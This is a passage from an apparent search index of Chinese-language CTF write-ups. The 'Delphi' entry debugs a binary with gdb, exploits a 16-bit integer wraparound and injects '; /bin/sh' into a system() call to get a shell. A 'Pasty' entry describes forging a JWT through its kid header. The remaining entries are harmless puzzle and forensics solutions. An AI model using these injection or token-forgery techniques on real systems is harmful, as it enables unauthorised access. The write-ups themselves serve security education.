| grep '.*main\\.go.*Scan' main.go:34 0x4016ee bd30b74f00 MOVL $bufio .ScanLines.f ( SB ) , BP main.go:35 0x401755 e816b80200 CALL bufio. ( *Scanner ) .Scan ( SB ) 0x401747 <main.main+1223>: mov QWORD PTR [ rsp+0x48 ] ,rax 0x40174c <main.main+1228>: mov rbx,QWORD PTR [ rsp+0x48 ] 0x401751 <main.main+1233>: mov QWORD PTR [ rsp ] ,rbx = > 0x401755 <main.main+1237>: call 0x42cf70 <bufio. ( *Scanner ) .Scan> 0x40175a <main.main+1242>: movzx rbx,BYTE PTR [ rsp+0x8 ] 0x401760 <main.main+1248>: cmp bl,0x0 0x401763 <main.main+1251>: je 0x4018b1 <main.main+1585> 0x401769 <main.main+1257>: mov rdi,QWORD PTR [ rsp+0x48 ] Guessed arguments: arg [ 0 ] : 0xc208028130 --> 0x0 arg [ 1 ] : 0x7ffff7e20df0 --> 0xc208020000 --> 0x0 \u8f38\u5165 deadbeef \u5f8c\u7e7c\u7e8c\u89c0\u5bdf \u767c\u73fe\u5f8c\u9762\u51fa\u73fe\u4e00\u6bb5\u6709\u8da3\u7684\u6bd4\u8f03\uff0c\u6b64\u6642\u7684 rdx \u662f\u8f38\u5165\u7684\u9577\u5ea6\uff0c rax \u662f 'go' \u7684\u9577\u5ea6 \u7531\u5e95\u4e0b jl \u548c jb \u53ef\u77e5 \u8f38\u5165\u4e0d\u80fd\u5c0f\u65bc 2 RAX: 0x2 RBX: 0x4d7f60 --> 0x4d7f70 --> 0x6f67 ( 'go' ) RCX: 0x66656562 ( 'beef' ) RDX: 0x8 RSI: 0x4d7f70 --> 0x6f67 ( 'go' ) RDI: 0xc208000260 ( \"deadbeef\" ) RBP: 0x7ffff7fb3000 --> 0x781d28 ( 0x00007ffff7fb3000 ) RSP: 0x7ffff7e20dc0 --> 0xc208013000 ( \"deadbeef\\n\" ) [ -------------------------------------code------------------------------------- ] 0x401939 <main.main+1721>: mov rax,QWORD PTR [ rbx+0x8 ] 0x40193d <main.main+1725>: mov QWORD PTR [ rsp+0x90 ] ,rdx 0x401945 <main.main+1733>: mov QWORD PTR [ rsp+0xb0 ] ,rax = > 0x40194d <main.main+1741>: cmp rdx,rax 0x401950 <main.main+1744>: jl 0x401baa <main.main+2346> 0x401956 <main.main+1750>: cmp rdx,rax 0x401959 <main.main+1753>: jb 0x401bb2 <main.main+2354> 0x40195f <main.main+1759>: mov QWORD PTR [ rsp+0xb8 ] ,rdi \u518d\u5f80\u4e0b\u770b\uff0c\u51fa\u73fe\u4e86 runtime.eqstring \u6bd4\u8f03\u7684\u76ee\u6a19\u662f \u8f38\u5165 ( 'deadbeef' ) \u4ee5\u53ca 'go' \u7684\u524d\u5169\u500b byte (0x2) 0x401986 <main.main+1798>: mov QWORD PTR [ rsp+0x18 ] ,rax = > 0x40198b <main.main+1803>: call 0x425600 <runtime.eqstring> 0x401990 <main.main+1808>: movzx rbx,BYTE PTR [ rsp+0x20 ] [ ------------------------------------stack------------------------------------- ] 0000 | 0x7ffff7e20dc0 --> 0xc208000260 ( \"deadbeef\" ) 0008 | 0x7ffff7e20dc8 --> 0x2 0016 | 0x7ffff7e20dd0 --> 0x4d7f70 --> 0x6f67 ( 'go' ) 0024 | 0x7ffff7e20dd8 --> 0x2 \u5be6\u969b\u6e2c\u8a66\u4e00\u4e0b\uff0c\u679c\u7136\u8f38\u5165\u958b\u982d\u662f go \u7684\u8a71\u5c31\u6703\u51fa\u73fe\u4e0d\u4e00\u6a23\u7684\u7d50\u679c LD_LIBRARY_PATH = . ./delphi Welcome! Are you ready to play 20 questions? No? Perfect! I 'm thinking of something big, metal, and orange. Go! > goabcd Sneaky, sneaky. Go where? How fast? > go Sneaky, sneaky. Go where? How fast? > abcd Who' s that? > \u6bd4\u5c0d\u6b63\u78ba\u5f8c\u5c31\u6703\u9032\u5165 main.doTheMagic \u4e86 0x401a0d <main.main+1933>: mov QWORD PTR [ rsp+0x8 ] ,rax = > 0x401a12 <main.main+1938>: call 0x401c30 <main.doTheMagic> 0x401a17 <main.main+1943>: lea rbx,ds:0x4d4060","title":"Input"},{"location":"Writeups/2015/B-Sides_Vancouver/Delphi/#dothemagic","text":"\u7e7c\u7e8c\u5f80\u4e0b\u770b\uff0c\u767c\u73fe strings.Split \uff0c\u4ee5\u7a7a\u683c( ' ' )\u4f5c\u70ba\u5207\u5272\u9ede \u7e7c\u7e8c\u57f7\u884c\u5f8c\u5c31\u7d50\u675f\u4e86 0x401c77 <main.doTheMagic+71>: mov rdi,rbp 0x401c7a <main.doTheMagic+74>: movs QWORD PTR es: [ rdi ] ,QWORD PTR ds: [ rsi ] 0x401c7c <main.doTheMagic+76>: movs QWORD PTR es: [ rdi ] ,QWORD PTR ds: [ rsi ] = > 0x401c7e <main.doTheMagic+78>: call 0x44a480 <strings.Split> 0x401c83 <main.doTheMagic+83>: mov rdx,QWORD PTR [ rsp+0x20 ] 0x401c88 <main.doTheMagic+88>: mov rax,QWORD PTR [ rsp+0x28 ] 0x401c8d <main.doTheMagic+93>: mov rcx,QWORD PTR [ rsp+0x30 ] 0x401c92 <main.doTheMagic+98>: mov QWORD PTR [ rsp+0x68 ] ,rdx Guessed arguments: arg [ 0 ] : 0x7ffff7e20d40 --> 0x8 arg [ 1 ] : 0x4d37d0 --> 0x20 ( ' ' ) \u53e6\u5916\u5728\u5f8c\u9762\u53ef\u4ee5\u627e\u5230 main._Cfunc_check_answer 401dbf: e8 6c 04 00 00 callq 402230 <main._Cfunc_check_answer> \u6211\u731c\u53ef\u80fd\u8f38\u5165\u8981\u7528\u7a7a\u683c\u5206\u6210\u597d\u5e7e\u6bb5\uff0c\u56e0\u6b64\u6211\u5728 main._Cfunc_check_answer \u8a2d\u65b7\u9ede\uff0c\u4e26\u586b\u5165\u4e0d\u540c\u6578\u76ee\u7684\u8f38\u5165\u6e2c\u8a66\uff0c\u6700\u5f8c\u767c\u73fe\u9700\u8981\u8f38\u5165\u5171\u4e09\u6bb5\u5c31\u6703\u7d93\u904e\u65b7\u9ede\uff0c\u8f38\u5165\u683c\u5f0f\u5982\u4e0b go <something> <something>","title":"doTheMagic"},{"location":"Writeups/2015/B-Sides_Vancouver/Delphi/#check_answer","text":"\u5f80\u4e0b\u770b\u767c\u73fe\u4ed6\u5229\u7528 cgocall \u547c\u53eb\u4e86 0x400f80 = > 0x402249 <main._Cfunc_check_answer+25>: mov eax,0x400f80 0x40224e <main._Cfunc_check_answer+30>: mov QWORD PTR [ rsp ] ,rax 0x402252 <main._Cfunc_check_answer+34>: lea rax, [ rsp+0x18 ] 0x402257 <main._Cfunc_check_answer+39>: mov QWORD PTR [ rsp+0x8 ] ,rax 0x40225c <main._Cfunc_check_answer+44>: call 0x404da0 <runtime.cgocall> gdb-peda$ x/5gi 0x400f80 0x400f80 <_cgo_de3376964270_Cfunc_check_answer>: mov rsi,QWORD PTR [ rdi+0x8 ] 0x400f84 <_cgo_de3376964270_Cfunc_check_answer+4>: mov edi,DWORD PTR [ rdi ] 0x400f86 <_cgo_de3376964270_Cfunc_check_answer+6>: jmp 0x400de0 <check_answer@plt> 0x400f8b: nop DWORD PTR [ rax+rax*1+0x0 ] 0x400f90 <_cgo_de3376964270_Cfunc_free>: mov rdi,QWORD PTR [ rdi ] \u8981\u8ffd\u9032\u53bb\u7684\u8a71\uff0c\u5efa\u8b70\u662f\u5728 0x400f80 \u8a2d\u65b7\u9ede\uff0c\u63a5\u8457 continue \u904e\u53bb\uff0c\u907f\u514d\u4e2d\u9014\u6c92\u8ddf\u5230 \u6700\u5f8c\u6703\u56de\u5230 check_answer = > 0x7ffff7bd5758 <check_answer>: push rbp 0x7ffff7bd5759 <check_answer+1>: mov rbp,rsp 0x7ffff7bd575c <check_answer+4>: sub rsp,0xa0 0x7ffff7bd5763 <check_answer+11>: mov DWORD PTR [ rbp-0x94 ] ,edi 0x7ffff7bd5769 <check_answer+17>: mov QWORD PTR [ rbp-0xa0 ] ,rsi \u5f80\u4e0b\u8ffd\u6703\u51fa\u73fe\u4e00\u500b\u6709\u8da3\u7684\u6771\u897f \u6b64\u6642\u7684 eax \u662f\u6700\u5f8c\u4e00\u6bb5\u8f38\u5165\u7684\u503c\uff0c\u56e0\u70ba\u6211\u8f38\u5165\u7684\u662f go abc def \uff0c\u6240\u4ee5\u9019\u908a\u7684 eax \u56e0\u7232\u8f49\u4e0d\u51fa\u4f86\u6240\u4ee5\u8b8a\u6210 0 add \u5f8c\u8b8a\u6210 42\uff0c\u7531\u6b64\u53ef\u77e5 [rbp-0x2] \u539f\u59cb\u503c\u61c9\u8a72\u662f 42 0x7ffff7bd5789 <check_answer+49>: mov eax,DWORD PTR [ rbp-0x94 ] = > 0x7ffff7bd578f <check_answer+55>: add WORD PTR [ rbp-0x2 ] ,ax 0x7ffff7bd5793 <check_answer+59>: movzx eax,WORD PTR [ rbp-0x2 ] 0x7ffff7bd5797 <check_answer+63>: cmp eax,0x4 0x7ffff7bd579a <check_answer+66>: ja 0x7ffff7bd57ed <check_answer+149> \u5982\u679c\u6bd4\u8f03\u7b26\u5408\u5f8c\u8df3\u904e\u53bb\uff0c\u6703\u51fa\u73fe strcat \u4ee5\u53ca system \u5728 stack \u4e2d\u53ef\u4ee5\u770b\u5230 \u2019echo' \u4ee5\u53ca\u7b2c\u4e8c\u6bb5\u8f38\u5165 'abc' \uff0c\u770b\u4f86\u662f\u5408\u6210 'echo abc' \u4ee5\u5f8c\u5229\u7528 system \u57f7\u884c = > 0x7ffff7bd57d7 <check_answer+127>: call 0x7ffff7bd5650 <strcat@plt> 0x7ffff7bd57dc <check_answer+132>: lea rax, [ rbp-0x90 ] 0x7ffff7bd57e3 <check_answer+139>: mov rdi,rax 0x7ffff7bd57e6 <check_answer+142>: call 0x7ffff7bd5630 <system@plt> [ ------------------------------------stack------------------------------------- ] 0000 | 0x7fffffffe4f0 --> 0x788170 --> 0x636261 ( 'abc' ) 0008 | 0x7fffffffe4f8 --> 0x0 0016 | 0x7fffffffe500 --> 0x206f686365 ( 'echo ' ) \u7d9c\u5408\u4e0a\u8ff0\uff0c\u6211\u5011\u61c9\u8a72\u8981\u4f7f 42 + {number} >= 4 \u9019\u88e1\u6709\u500b\u6709\u8da3\u7684\u5730\u65b9\uff0c\u4ed6\u5728\u53d6\u503c\u7684\u6642\u5019\u662f\u4f7f\u7528 WORD (2 bytes) \u4f86\u53d6\uff0c\u7576\u9019\u88e1\u7684\u503c\u8d85\u904e WORD \u4e0a\u9650\u6642\u5c31\u6703\u6b78\u96f6\uff0c\u6211\u5011\u53ef\u4ee5\u5229\u7528\u9019\u500b\u9ede\u4f86\u9054\u6210\u4e0a\u8ff0\u7684\u689d\u4ef6 number = 2^16 - 42 + eax","title":"check_answer"},{"location":"Writeups/2015/B-Sides_Vancouver/Delphi/#command-injection","text":"\u524d\u9762\u6709\u770b\u5230\u7d44\u5408\u7684 'echo abc' \uff0c\u6b64\u6642\u53ef\u4ee5\u5229\u7528 ; \u4f86\u9032\u884c command injection \u4f86\u62ff\u5230 shell $ LD_LIBRARY_PATH = . ./delphi Welcome! Are you ready to play 20 questions? No? Perfect! I ' m thinking of something big, metal, and orange. Go! > go abc ; /bin/sh 65498 # 2^16 - 42 + 4 (eax = 4) abc $ ls delphi libtwenty.so peda-session-delphi.txt $","title":"command injection"},{"location":"Writeups/2017/HITB_CTF/2017_Dating_in_Singapore/","text":"2017, Dating in Singapore Challenge Link: 2017, Dating in Singapore Category: MISC Writeup: 2017, Dating in Singapore 01081522291516170310172431-050607132027162728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625 \u5206\u6790\u5b57\u4e32 \u7528 - \u5206\u9694\u7684\u8a71\u5171\u670912\u6bb5 \u6bcf\u6bb5\u7684\u9577\u5ea6\u4e0d\u4e00\u6a23\uff0c\u4f46\u90fd\u662f\u96d9\u6578 \u5617\u8a66 \u6bcf\u5169\u500b\u4e00\u7d44\u8f49\u6210ascii -> \u6c92\u610f\u601d \u8f49\u6210hex -> \u6c92\u610f\u601d \u89e3\u6cd5 \u89c0\u5bdf\u6a19\u984c \u201c2017, Dating in Singapore\u201d -> \u53ef\u80fd\u8ddf\u65e5\u671f\u6709\u95dc \u767c\u73fe\u6bcf\u5169\u500b\u4e00\u7d44\u90fd\u4e0d\u6703\u8d85\u904e31\uff0c\u53c8\u5171\u670912\u500b\u6708 \u627e\u5230\u65b0\u52a0\u57612017\u7684\u6708\u66c6\u5f8c\u5c07\u5c0d\u61c9\u7684\u65e5\u671f\u6a19\u8a18\u51fa\u4f86","title":"2017, Dating in Singapore"},{"location":"Writeups/2017/HITB_CTF/2017_Dating_in_Singapore/#2017-dating-in-singapore","text":"Challenge Link: 2017, Dating in Singapore Category: MISC Writeup: 2017, Dating in Singapore 01081522291516170310172431-050607132027162728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625","title":"2017, Dating in Singapore"},{"location":"Writeups/2017/HITB_CTF/2017_Dating_in_Singapore/#_1","text":"\u7528 - \u5206\u9694\u7684\u8a71\u5171\u670912\u6bb5 \u6bcf\u6bb5\u7684\u9577\u5ea6\u4e0d\u4e00\u6a23\uff0c\u4f46\u90fd\u662f\u96d9\u6578","title":"\u5206\u6790\u5b57\u4e32"},{"location":"Writeups/2017/HITB_CTF/2017_Dating_in_Singapore/#_2","text":"\u6bcf\u5169\u500b\u4e00\u7d44\u8f49\u6210ascii -> \u6c92\u610f\u601d \u8f49\u6210hex -> \u6c92\u610f\u601d","title":"\u5617\u8a66"},{"location":"Writeups/2017/HITB_CTF/2017_Dating_in_Singapore/#_3","text":"\u89c0\u5bdf\u6a19\u984c \u201c2017, Dating in Singapore\u201d -> \u53ef\u80fd\u8ddf\u65e5\u671f\u6709\u95dc \u767c\u73fe\u6bcf\u5169\u500b\u4e00\u7d44\u90fd\u4e0d\u6703\u8d85\u904e31\uff0c\u53c8\u5171\u670912\u500b\u6708 \u627e\u5230\u65b0\u52a0\u57612017\u7684\u6708\u66c6\u5f8c\u5c07\u5c0d\u61c9\u7684\u65e5\u671f\u6a19\u8a18\u51fa\u4f86","title":"\u89e3\u6cd5"},{"location":"Writeups/2017/HITB_CTF/Flying_High/","text":"Flying_High Challenge Link: Flying_High Category: MISC Writeup: Flying_High We found a crashed drone, are you able to recover information what this drone was doing? Flying_High.tar.gz :43ce56686b4f38b68108140825434f76bfed47530a92f3a6469c202746c257f2 \u5206\u6790 \u9644\u4ef6\u6253\u958b\u5f8c\u6709\u56db\u500bbinanry\u6a94 image0.bin image1.bin image2.bin image3.bin \u7528binwalk\u767c\u73fe\u88e1\u9762\u6709\u5f88\u591a\u6a94\u6848 DECIMAL HEXADECIMAL DESCRIPTION 0 0x0 UBIFS filesystem superblock node, CRC: 0x3A905A7, flags: 0x0, min I/O unit size: 2048, erase block size: 126976, erase block count: 58, max erase blocks: 58, format version: 4, compression type: none \u2026 262144 0x40000 UBIFS filesystem master node, CRC: 0x40782ADA, highest inode: 72, commit number: 61 264192 0x40800 UBIFS filesystem master node, CRC: 0x6D072259, highest inode: 72, commit number: 62 266240 0x41000 UBIFS filesystem master node, CRC: 0x13DCBFF9, highest inode: 72, commit number: 63 268288 0x41800 UBIFS filesystem master node, CRC: 0x1EDB0C74, highest inode: 73, commit number: 64 270336 0x42000 UBIFS filesystem master node, CRC: 0x5E9D0073, highest inode: 73, commit number: 65 272384 0x42800 UBIFS filesystem master node, CRC: 0xFF510C2, highest inode: 74, commit number: 66 274432 0x43000 UBIFS filesystem master node, CRC: 0xB70FE71F, highest inode: 74, commit number: 67 1525808 0x174830 XML document, version: \"1.0\" 1527856 0x175030 XML document, version: \"1.0\" 1529904 0x175830 XML document, version: \"1.0\" 1531952 0x176030 XML document, version: \"1.0\" 1534000 0x176830 XML document, version: \"1.0\" 1536048 0x177030 XML document, version: \"1.0\" 1538168 0x177878 XML document, version: \"1.0\" 1540144 0x178030 XML document, version: \"1.0\" 1542192 0x178830 XML document, version: \"1.0\" 1544240 0x179030 XML document, version: \"1.0\" 1546288 0x179830 XML document, version: \"1.0\" 1548336 0x17A030 XML document, version: \"1.0\" 1550384 0x17A830 XML document, version: \"1.0\" 1552432 0x17B030 XML document, version: \"1.0\" 1554480 0x17B830 XML document, version: \"1.0\" 1556528 0x17C030 XML document, version: \"1.0\" 1558576 0x17C830 XML document, version: \"1.0\" 1560624 0x17D030 Zip archive data, at least v2.0 to extract, compressed size: 3725, uncompressed size: 23763, name: FVT1_MB\\FVT1_MB.xml 1564398 0x17DEEE Zip archive data, at least v2.0 to extract, compressed size: 1414, uncompressed size: 5298, name: FVT1_MB\\SETTINGS\\SETTINGS_FVT1_MB_TESTER_1.xml 1565936 0x17E4F0 Zip archive data, at least v2.0 to extract, compressed size: 433, uncompressed size: 1440, name: FVT1_MB\\TRACE.xml 1566416 0x17E6D0 Zip archive data, at least v2.0 to extract, compressed size: 1340, uncompressed size: 20339, name: HMI_1_TESTER.xml 1567802 0x17EC3A Zip archive data, at least v2.0 to extract, compressed size: 304, uncompressed size: 815, name: MAIN.xml \u2026 \u5617\u8a66 \u6bcf\u500bbinanry\u90fddump\u51fa\u4f86\u770b\u770b\uff0c\u5167\u542b\u591a\u500bxml\u6a94 - \u7a0d\u5fae\u770b\u4e86\u4e0b\uff0c\u4e0d\u592a\u660e\u767d\u5167\u5bb9\u662f\u5565 - \u7528strings\u6383\u904e\uff0c\u6c92\u627e\u5230hitb, flag\u4e4b\u985e\u7684\u5b57\u773c \u89e3\u6cd5 \u7528 file \u78ba\u5b9a\u6a94\u6848\u578b\u5225 -> \u767c\u73feUBIfs % file image0.bin image0.bin: UBIfs image, sequence number 1, length 4096, CRC 0x03a905a7 \u5229\u7528 ubireader \u62c9\u51fa\u5b8c\u6574\u7684\u76ee\u9304\u7d50\u69cb \u5728image3.bin\u4e2d\u767c\u73fe\u4e00\u652f\u5f71\u7247","title":"Flying_High"},{"location":"Writeups/2017/HITB_CTF/Flying_High/#flying_high","text":"Challenge Link: Flying_High Category: MISC Writeup: Flying_High We found a crashed drone, are you able to recover information what this drone was doing? Flying_High.tar.gz :43ce56686b4f38b68108140825434f76bfed47530a92f3a6469c202746c257f2","title":"Flying_High"},{"location":"Writeups/2017/HITB_CTF/Flying_High/#_1","text":"\u9644\u4ef6\u6253\u958b\u5f8c\u6709\u56db\u500bbinanry\u6a94 image0.bin image1.bin image2.bin image3.bin \u7528binwalk\u767c\u73fe\u88e1\u9762\u6709\u5f88\u591a\u6a94\u6848 DECIMAL HEXADECIMAL DESCRIPTION 0 0x0 UBIFS filesystem superblock node, CRC: 0x3A905A7, flags: 0x0, min I/O unit size: 2048, erase block size: 126976, erase block count: 58, max erase blocks: 58, format version: 4, compression type: none \u2026 262144 0x40000 UBIFS filesystem master node, CRC: 0x40782ADA, highest inode: 72, commit number: 61 264192 0x40800 UBIFS filesystem master node, CRC: 0x6D072259, highest inode: 72, commit number: 62 266240 0x41000 UBIFS filesystem master node, CRC: 0x13DCBFF9, highest inode: 72, commit number: 63 268288 0x41800 UBIFS filesystem master node, CRC: 0x1EDB0C74, highest inode: 73, commit number: 64 270336 0x42000 UBIFS filesystem master node, CRC: 0x5E9D0073, highest inode: 73, commit number: 65 272384 0x42800 UBIFS filesystem master node, CRC: 0xFF510C2, highest inode: 74, commit number: 66 274432 0x43000 UBIFS filesystem master node, CRC: 0xB70FE71F, highest inode: 74, commit number: 67 1525808 0x174830 XML document, version: \"1.0\" 1527856 0x175030 XML document, version: \"1.0\" 1529904 0x175830 XML document, version: \"1.0\" 1531952 0x176030 XML document, version: \"1.0\" 1534000 0x176830 XML document, version: \"1.0\" 1536048 0x177030 XML document, version: \"1.0\" 1538168 0x177878 XML document, version: \"1.0\" 1540144 0x178030 XML document, version: \"1.0\" 1542192 0x178830 XML document, version: \"1.0\" 1544240 0x179030 XML document, version: \"1.0\" 1546288 0x179830 XML document, version: \"1.0\" 1548336 0x17A030 XML document, version: \"1.0\" 1550384 0x17A830 XML document, version: \"1.0\" 1552432 0x17B030 XML document, version: \"1.0\" 1554480 0x17B830 XML document, version: \"1.0\" 1556528 0x17C030 XML document, version: \"1.0\" 1558576 0x17C830 XML document, version: \"1.0\" 1560624 0x17D030 Zip archive data, at least v2.0 to extract, compressed size: 3725, uncompressed size: 23763, name: FVT1_MB\\FVT1_MB.xml 1564398 0x17DEEE Zip archive data, at least v2.0 to extract, compressed size: 1414, uncompressed size: 5298, name: FVT1_MB\\SETTINGS\\SETTINGS_FVT1_MB_TESTER_1.xml 1565936 0x17E4F0 Zip archive data, at least v2.0 to extract, compressed size: 433, uncompressed size: 1440, name: FVT1_MB\\TRACE.xml 1566416 0x17E6D0 Zip archive data, at least v2.0 to extract, compressed size: 1340, uncompressed size: 20339, name: HMI_1_TESTER.xml 1567802 0x17EC3A Zip archive data, at least v2.0 to extract, compressed size: 304, uncompressed size: 815, name: MAIN.xml \u2026","title":"\u5206\u6790"},{"location":"Writeups/2017/HITB_CTF/Flying_High/#_2","text":"\u6bcf\u500bbinanry\u90fddump\u51fa\u4f86\u770b\u770b\uff0c\u5167\u542b\u591a\u500bxml\u6a94 - \u7a0d\u5fae\u770b\u4e86\u4e0b\uff0c\u4e0d\u592a\u660e\u767d\u5167\u5bb9\u662f\u5565 - \u7528strings\u6383\u904e\uff0c\u6c92\u627e\u5230hitb, flag\u4e4b\u985e\u7684\u5b57\u773c","title":"\u5617\u8a66"},{"location":"Writeups/2017/HITB_CTF/Flying_High/#_3","text":"\u7528 file \u78ba\u5b9a\u6a94\u6848\u578b\u5225 -> \u767c\u73feUBIfs % file image0.bin image0.bin: UBIfs image, sequence number 1, length 4096, CRC 0x03a905a7 \u5229\u7528 ubireader \u62c9\u51fa\u5b8c\u6574\u7684\u76ee\u9304\u7d50\u69cb \u5728image3.bin\u4e2d\u767c\u73fe\u4e00\u652f\u5f71\u7247","title":"\u89e3\u6cd5"},{"location":"Writeups/2017/HITB_CTF/Pasty/","text":"Pasty Challenge Link: Pasty Category: Web Writeup: Pasty Can you find the administrator's secret message? \u5206\u6790 \u6b64\u984c\u63d0\u4f9b\u4e00\u500b\u53ef\u4ee5\u7528\u5e33\u5bc6\u767b\u5165\u7684\u8a18\u4e8b\u672c\u7db2\u7ad9\uff0c\u76ee\u6a19\u662f\u53d6\u5f97\u7ba1\u7406\u54e1\u5e33\u5bc6 - \u767c\u73fe\u767b\u5165\u5f8c\u7528jwt\u4f5c\u70batoken\u4f86\u8a8d\u8b49 - \u53ea\u8981\u6539\u52d5token\u4e2d\uff0c\u4f7f\u7528\u8005\u7684\u540d\u5b57\u5c31\u53ef\u4ee5\u9054\u6210\u4e86 \u5617\u8a66 \u4e0a\u7db2\u627ejwt\u7684\u6f0f\u6d1e\u4e4b\u985e\u7684 -> \u627e\u5230\u7684\u4e0d\u80fd\u7528QQ \u89e3\u6cd5 jwt\u7684header\u4e2d\u6709\u4e00\u500b kid \uff0c\u9019\u500b\u4ee3\u8868\u7684\u662f\u516c\u9470\u7684\u4f4d\u5740 -> \u53ef\u4ee5\u81ea\u5df1\u7522\u751f\u516c\u79c1\u9470\uff0c\u7528\u79c1\u9470\u52a0\u5bc6\u5f8c\uff0c\u628akid\u6539\u6210\u516c\u9470\u4f4d\u5740\u9001\u56de\u53bb \u4f46\u662f\u516c\u9470\u7684\u4f4d\u5740\u5728\u4f3a\u670d\u5668\u5e95\u4e0b\u7684\u76ee\u9304\uff0c\u6240\u4ee5\u8981\u5148\u628a\u516c\u9470\u8cbc\u5728pasty\u4e0a\uff0c\u63a5\u8457\u53d6\u51fa\u5728\u4f3a\u670d\u5668\u4e0a\u7684\u4f4d\u5740\u8cbc\u9032\u53bb \u516c\u9470\u6703\u81ea\u52d5\u52a0\u4e0a.pem\u8a72\u5982\u4f55\u8655\u7406\uff1f \u5728\u7db2\u5740\u6700\u5f8c\u9762\u52a0\u4e0a?\uff0c\u8b93.pem\u8b8a\u6210\u53c3\u6578","title":"Pasty"},{"location":"Writeups/2017/HITB_CTF/Pasty/#pasty","text":"Challenge Link: Pasty Category: Web Writeup: Pasty Can you find the administrator's secret message?","title":"Pasty"},{"location":"Writeups/2017/HITB_CTF/Pasty/#_1","text":"\u6b64\u984c\u63d0\u4f9b\u4e00\u500b\u53ef\u4ee5\u7528\u5e33\u5bc6\u767b\u5165\u7684\u8a18\u4e8b\u672c\u7db2\u7ad9\uff0c\u76ee\u6a19\u662f\u53d6\u5f97\u7ba1\u7406\u54e1\u5e33\u5bc6 - \u767c\u73fe\u767b\u5165\u5f8c\u7528jwt\u4f5c\u70batoken\u4f86\u8a8d\u8b49 - \u53ea\u8981\u6539\u52d5token\u4e2d\uff0c\u4f7f\u7528\u8005\u7684\u540d\u5b57\u5c31\u53ef\u4ee5\u9054\u6210\u4e86","title":"\u5206\u6790"},{"location":"Writeups/2017/HITB_CTF/Pasty/#_2","text":"\u4e0a\u7db2\u627ejwt\u7684\u6f0f\u6d1e\u4e4b\u985e\u7684 -> \u627e\u5230\u7684\u4e0d\u80fd\u7528QQ","title":"\u5617\u8a66"},{"location":"Writeups/2017/HITB_CTF/Pasty/#_3","text":"jwt\u7684header\u4e2d\u6709\u4e00\u500b kid \uff0c\u9019\u500b\u4ee3\u8868\u7684\u662f\u516c\u9470\u7684\u4f4d\u5740 -> \u53ef\u4ee5\u81ea\u5df1\u7522\u751f\u516c\u79c1\u9470\uff0c\u7528\u79c1\u9470\u52a0\u5bc6\u5f8c\uff0c\u628akid\u6539\u6210\u516c\u9470\u4f4d\u5740\u9001\u56de\u53bb \u4f46\u662f\u516c\u9470\u7684\u4f4d\u5740\u5728\u4f3a\u670d\u5668\u5e95\u4e0b\u7684\u76ee\u9304\uff0c\u6240\u4ee5\u8981\u5148\u628a\u516c\u9470\u8cbc\u5728pasty\u4e0a\uff0c\u63a5\u8457\u53d6\u51fa\u5728\u4f3a\u670d\u5668\u4e0a\u7684\u4f4d\u5740\u8cbc\u9032\u53bb \u516c\u9470\u6703\u81ea\u52d5\u52a0\u4e0a.pem\u8a72\u5982\u4f55\u8655\u7406\uff1f \u5728\u7db2\u5740\u6700\u5f8c\u9762\u52a0\u4e0a?\uff0c\u8b93.pem\u8b8a\u6210\u53c3\u6578","title":"\u89e3\u6cd5"},{"location":"Writeups/2017/seccon_CTF/Qubic_Rube/","text":"Qubic Rube Challenge Link: Qubic_Rube Category: programming Writeup: Qubic Rube Please continue to solve Rubic's Cube and read QR code. http://qubicrube.pwn.seccon.jp:33654 Solution This challenge is really a \" programming challenge \". Orz This site give you a Rubik's Cube like the photo below, you should solve it and scan the QRcode. Then, you will get a link to the next Rubik's Cube...... Be careful: The URLs are not always the same color download all six images and split each one to nine parts. categorized depend on the background color. there are four possible pieces at same place because of rotation. try every possible QRcode brutally to find the right one. ******************11ed5b705e72e9fa2e57****************** 11 : (255, 213, 0) SECCON 2017 Online CTF 11 : (196, 30, 58) Qubic Rube 11 : (255, 88, 0) Next URL is: 11 : (255, 255, 255) Have fun! 11 : (0, 81, 186) No. 11 / 50 11 : (0, 158, 96) http://qubicrube.pwn.seccon.jp:33654/12de86366ccad8ad3f0e find at color (0, 158, 96) ******************12de86366ccad8ad3f0e****************** 12 : (255, 213, 0) No. 12 / 50 12 : (196, 30, 58) Next URL is: 12 : (255, 88, 0) Qubic Rube 12 : (255, 255, 255) http://qubicrube.pwn.seccon.jp:33654/131c139206e8120f4e89 find at color (255, 255, 255) ******************131c139206e8120f4e89****************** 13 : (255, 213, 0) Next URL is: Dependency PIL zbarlight","title":"Qubic Rube"},{"location":"Writeups/2017/seccon_CTF/Qubic_Rube/#qubic-rube","text":"Challenge Link: Qubic_Rube Category: programming Writeup: Qubic Rube Please continue to solve Rubic's Cube and read QR code. http://qubicrube.pwn.seccon.jp:33654","title":"Qubic Rube"},{"location":"Writeups/2017/seccon_CTF/Qubic_Rube/#solution","text":"This challenge is really a \" programming challenge \". Orz This site give you a Rubik's Cube like the photo below, you should solve it and scan the QRcode. Then, you will get a link to the next Rubik's Cube...... Be careful: The URLs are not always the same color download all six images and split each one to nine parts. categorized depend on the background color. there are four possible pieces at same place because of rotation. try every possible QRcode brutally to find the right one. ******************11ed5b705e72e9fa2e57****************** 11 : (255, 213, 0) SECCON 2017 Online CTF 11 : (196, 30, 58) Qubic Rube 11 : (255, 88, 0) Next URL is: 11 : (255, 255, 255) Have fun! 11 : (0, 81, 186) No. 11 / 50 11 : (0, 158, 96) http://qubicrube.pwn.seccon.jp:33654/12de86366ccad8ad3f0e find at color (0, 158, 96) ******************12de86366ccad8ad3f0e****************** 12 : (255, 213, 0) No. 12 / 50 12 : (196, 30, 58) Next URL is: 12 : (255, 88, 0) Qubic Rube 12 : (255, 255, 255) http://qubicrube.pwn.seccon.jp:33654/131c139206e8120f4e89 find at color (255, 255, 255) ******************131c139206e8120f4e89****************** 13 : (255, 213, 0) Next URL is:","title":"Solution"},{"location":"Writeups/2017/seccon_CTF/Qubic_Rube/#dependency","text":"PIL zbarlight","title":"Dependency"},{"location":"Writeups/2017/seccon_CTF/putchar_music/","text":"putchar music Challenge Link: putchar_music Category: programming Writeup: putchar music This one line of C program works on Linux Desktop. What is this movie's title? Please answer the flag as SECCON{MOVIES_TITLE}, replace all alphabets with capital letters, and spaces with underscores. main ( t , i , j ){ unsigned char p [] = \"###<f_YM \\204 g_YM \\204 g_Y_H #<f_YM \\204 g_YM \\204 g_Y_H #+-?[WKAMYJ/7 #+-?[WKgH #+-?[WKAMYJ/7hk \\206\\203 tk \\\\ YJAfkkk\" ; for ( i = 0 ; 